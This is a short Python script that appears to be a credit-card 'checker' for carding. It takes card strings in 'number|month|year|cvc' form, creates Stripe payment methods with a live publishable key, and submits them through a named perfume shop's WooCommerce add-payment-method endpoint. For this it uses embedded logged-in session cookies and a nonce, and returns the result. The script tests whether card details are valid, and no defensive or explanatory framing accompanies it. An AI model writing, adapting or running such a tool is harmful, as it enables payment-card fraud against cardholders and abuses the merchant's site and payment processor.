import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&payment_user_agent=stripe.js%2Fe4b3a3b372%3B+stripe-js-v3%2Fe4b3a3b372%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fbestbrandsperfume.com&time_on_page=375793&client_attribution_metadata[client_session_id]=533c00da-1e9a-4974-8aed-97d641471912&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=8b45ed25-67ec-4572-8fc6-a1617e870e05&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=NA&muid=NA&sid=NA&key=pk_live_cdqmwcz5wrskM2YYfc8fGgfQ00SrYFmtLZ&_stripe_version=2024-06-20'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	
	cookies = {
	    'wordpress_sec_483e6b08cc6cd44d373f9e3543608153': 'zombime%7C1773546199%7CY60to5TwnOqH8GSZoLBYeQIcwnNRaaEBwdNgGK3fxyB%7Ce8323a583ea524ac9106d9a7b4e195f09db2af53043bb6e8f010729d6fcf0617',
	    'ia_leadsource': 'bestbrandsperfume.com',
	    'wordpress_logged_in_483e6b08cc6cd44d373f9e3543608153': 'zombime%7C1773546199%7CY60to5TwnOqH8GSZoLBYeQIcwnNRaaEBwdNgGK3fxyB%7C04f6cf89055b0b4bb1c05728bee312d41cb12a1b04cf03d72d1b6adb03fb6599',
	    '__stripe_mid': 'a9431cbb-4169-49ba-99a8-b7e56b2f46d5c051e1',
	    'sbjs_migrations': '1418474375998%3D1',
	    'sbjs_current_add': 'fd%3D2026-03-02%2015%3A05%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fbestbrandsperfume.com%2Fmy-account-2%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fbestbrandsperfume.com%2Fmy-account-2%2Fpayment-methods%2F',
	    'sbjs_first_add': 'fd%3D2026-03-02%2015%3A05%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fbestbrandsperfume.com%2Fmy-account-2%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fbestbrandsperfume.com%2Fmy-account-2%2Fpayment-methods%2F',
	    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
	    'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fbestbrandsperfume.com%2Fmy-account-2%2Fadd-payment-method%2F',
	    '__stripe_sid': 'ff2e9131-e602-442f-98d5-823e77fce7d22d5a35',
	}
	
	headers = {
	    'authority': 'bestbrandsperfume.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': 'wordpress_sec_483e6b08cc6cd44d373f9e3543608153=zombime%7C1773546199%7CY60to5TwnOqH8GSZoLBYeQIcwnNRaaEBwdNgGK3fxyB%7Ce8323a583ea524ac9106d9a7b4e195f09db2af53043bb6e8f010729d6fcf0617; ia_leadsource=bestbrandsperfume.com; wordpress_logged_in_483e6b08cc6cd44d373f9e3543608153=zombime%7C1773546199%7CY60to5TwnOqH8GSZoLBYeQIcwnNRaaEBwdNgGK3fxyB%7C04f6cf89055b0b4bb1c05728bee312d41cb12a1b04cf03d72d1b6adb03fb6599; __stripe_mid=a9431cbb-4169-49ba-99a8-b7e56b2f46d5c051e1; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-03-02%2015%3A05%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fbestbrandsperfume.com%2Fmy-account-2%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fbestbrandsperfume.com%2Fmy-account-2%2Fpayment-methods%2F; sbjs_first_add=fd%3D2026-03-02%2015%3A05%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fbestbrandsperfume.com%2Fmy-account-2%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fbestbrandsperfume.com%2Fmy-account-2%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fbestbrandsperfume.com%2Fmy-account-2%2Fadd-payment-method%2F; __stripe_sid=ff2e9131-e602-442f-98d5-823e77fce7d22d5a35',
	    'origin': 'https://bestbrandsperfume.com',
	    'referer': 'https://bestbrandsperfume.com/my-account-2/add-payment-method/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	data = {
	    'action': 'wc_stripe_create_and_confirm_setup_intent',
	    'wc-stripe-payment-method': f'{pm}',
	    'wc-stripe-payment-type': 'card',
	    '_ajax_nonce': 'f55cf9dddc',
	}
	
	r2 = requests.post('https://bestbrandsperfume.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
	
	return (r2.json())
